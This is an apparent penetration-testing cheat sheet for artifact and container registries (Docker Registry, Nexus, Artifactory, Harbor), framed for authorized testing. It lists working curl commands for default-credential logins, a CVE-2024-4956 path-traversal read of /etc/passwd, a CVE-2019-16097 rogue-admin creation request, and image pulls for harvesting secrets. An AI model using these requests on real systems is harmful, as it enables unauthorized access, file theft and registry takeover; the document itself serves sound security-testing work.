---
service: artifact
title: Artifact / Package / Container Registries
ports: 5000, 8081, 8082, 443
aliases: docker-registry, nexus, artifactory, harbor
---

# Artifact registries — quick wins

**When you see it:** a Docker Registry v2 (`/v2/_catalog`), Nexus, Artifactory, or Harbor
endpoint answering unauthenticated — registries hold build artifacts, container images, and
CI credentials, and default admin creds are common. aranum probes read-side only (status /
catalog); pulls and writes are out of scope.

> Authorized testing only. Triage is read-only; steps marked ✏️ pull/download or write to
> the registry — get sign-off before pulling images or pushing layers.

## Triage (read-only)
```sh
curl -sk https://H:5000/v2/                         # Docker Registry v2 (200/401 = present)
curl -sk https://H:5000/v2/_catalog                 # unauth repository catalog
curl -sk http://H:8081/service/rest/v1/status       # Nexus status + edition
curl -sk http://H:8081/artifactory/api/system/version   # Artifactory version
curl -sk https://H/api/v2.0/systeminfo              # Harbor version + auth mode
```

## Quick wins

### Docker Registry v2 — unauth catalog → image pull ✏️
```sh
curl -sk https://H:5000/v2/_catalog
curl -sk https://H:5000/v2/REPO/tags/list
# pull + inspect a layer for secrets:
docker pull H:5000/REPO:TAG && docker save H:5000/REPO:TAG -o img.tar
```
*Why:* an anonymous `_catalog` means you can pull every image; layers routinely embed `.env`,
cloud tokens, and source. `push` capability = supply-chain compromise.

### Nexus default creds / CVE pivot ✏️
```sh
curl -sk -u admin:admin123 http://H:8081/service/rest/v1/status/check
# path traversal read (Nexus 3.x < 3.68.1):  CVE-2024-4956
curl -sk "http://H:8081/%2F%2F%2F%2F%2F%2F..%2f..%2f..%2f..%2fetc%2fpasswd"
```
*Why:* Nexus ships `admin:admin123`; CVE-2024-4956 gives unauth arbitrary file read, and
CVE-2019-7238 (Nexus 3 < 3.15) is unauth RCE via the components API.

### Artifactory default admin ✏️
```sh
curl -sk -u admin:password http://H:8081/artifactory/api/system/ping
```
*Why:* `admin:password` is the JFrog default; authenticated access exposes every repo,
build info, and often deploy tokens reusable across the pipeline.

### Harbor unauth admin-creation — CVE-2019-16097 ✏️
```sh
curl -sk -XPOST -H "Content-Type: application/json" https://H/api/users \
  -d '{"username":"pwn","email":"a@a.io","password":"Passw0rd!","realname":"x","has_admin_role":true}'
```
*Why:* Harbor < 1.7.6 / 1.8.3 ignores the `has_admin_role` field on registration → create your
own admin and take the registry.

## aranum helpers
- `aranumtoolkit/network/enum-artifact.sh` — dispatcher (Registry v2 / Nexus / Artifactory / Harbor status + catalog, read-only).

## Gotchas
- Registry v2 401 means auth is required, but token realms are often misconfigured — check `Www-Authenticate` and try anonymous token issuance.
- Nexus/Artifactory both default to 8081 (and 8082 for Artifactory Docker); fingerprint before assuming which product.
- Harbor sits behind 80/443 with a reverse proxy — API base is `/api/v2.0/` (v2) or `/api/` (legacy v1).
- Pulling large images is loud and slow — target tags likely to hold secrets (`latest`, `builder`, `ci`).

## Sources
- Docker Registry HTTP API v2 spec; CVE-2024-4956 / CVE-2019-7238 (Nexus); CVE-2019-16097 (Harbor);
  HackTricks `5000-pentesting-docker-registry`.
